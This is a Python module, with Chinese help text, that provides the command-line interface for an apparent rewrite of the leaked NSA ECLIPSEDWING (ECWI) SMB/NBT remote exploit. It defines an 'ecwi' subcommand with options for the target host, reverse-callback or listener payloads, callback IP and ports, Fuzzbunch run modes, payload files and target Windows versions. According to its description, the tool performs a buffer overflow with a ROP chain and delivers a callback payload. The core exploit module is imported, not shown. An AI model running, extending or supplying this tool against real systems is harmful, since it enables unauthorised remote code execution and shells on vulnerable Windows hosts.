"""ecwi — ECWI (ECLIPSEDWING / ECWI) SMB/NBT 远程利用。

Python 重写的 NSA ECWI 利用工具 `ecwi.exe` / `RPC2.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 SMB/NBT 利用流程。
"""

from . import ecwi


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def ecwi_handle(args):
    """Run the ECWI exploitation sequence against the supplied host."""
    return ecwi.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        protocol=args.protocol,
        payload=args.payload,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        callin_port=args.callin_port,
        callin_timeout=args.callin_timeout,
        run_mode=args.run_mode,
        ride_area=args.ride_area,
        lp_filename=args.lp_filename,
        lp_entry_point=args.lp_entry_point,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `ecwi` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "ecwi",
        help="ECWI (ECLIPSEDWING) SMB/NBT 远程利用",
        description="Python 重写的 NSA ECWI 利用工具 ecwi.exe / RPC2.exe。"
                    "通过 SMB/NBT 驱动，执行缓冲区溢出与 ROP 链利用，"
                    "并可选投递 egg 回连载荷。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标端口（SMB 默认 445，NBT 默认 139）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--protocol",
        choices=["SMB", "NBT"],
        default="SMB",
        help="协议类型（默认 SMB）",
    )
    p.add_argument(
        "--payload",
        choices=["Callback", "Listener"],
        default="Callback",
        help="载荷类型：Callback 目标连回，Listener 目标监听等待连入",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Listener 模式：目标监听端口",
    )
    p.add_argument(
        "--callin-port", type=int, metavar="PORT",
        help="Listener 模式：攻击机连回的端口",
    )
    p.add_argument(
        "--callin-timeout", type=int, default=60,
        help="Listener 模式：连入前等待超时秒（默认 60）",
    )
    p.add_argument(
        "--run-mode",
        choices=["EDF", "Standalone"],
        default="EDF",
        help="运行模式：EDF (FB2/GH) 或 Standalone (EDE Fuzzbunch)",
    )
    p.add_argument(
        "--ride-area", metavar="FILE",
        help="Standalone 模式：Ridearea 载荷文件",
    )
    p.add_argument(
        "--lp-filename", metavar="FILE",
        help="Standalone 模式：LP 载荷文件",
    )
    p.add_argument(
        "--lp-entry-point", metavar="NAME", default="ServiceEntry",
        help="Standalone 模式：LP 入口点函数名（默认 ServiceEntry）",
    )
    p.add_argument(
        "--target-os",
        choices=["W2KSP4", "XPSP2", "XPSP3", "W2K3SP1", "W2K3SP2"],
        default="W2K3SP2",
        help="目标操作系统与服务包（默认 W2K3SP2）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=ecwi_handle)
